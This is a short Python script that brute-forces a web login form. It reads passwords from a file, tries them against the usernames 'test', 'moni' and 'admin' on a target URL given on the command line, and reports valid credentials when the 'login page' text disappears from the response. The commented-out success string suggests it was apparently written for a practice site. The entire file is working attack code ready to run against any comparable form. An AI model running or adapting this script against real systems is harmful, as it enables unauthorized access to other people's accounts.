import sys
import requests

target = sys.argv[1]
usernames = ['test', 'moni', 'admin']
password_file = sys.argv[2]
#needle = "On this page you can visualize or edit you user information."
needle = "login page"
attempt = 1

for username in usernames:
    with open(password_file, "r") as password_list:
        for password in password_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempt {} -> {}:{}".format(attempt, username, password.decode()))
            sys.stdout.flush()
            sys.stdout.write("\n")
            r = requests.post(target, data={"uname": username, "pass": password})
            if needle.encode() not in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("[Y] Attempt {} --> Attack success, Valid creds = {}:{}".format(attempt, username, password))
                sys.exit()
            attempt += 1
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("No password found")
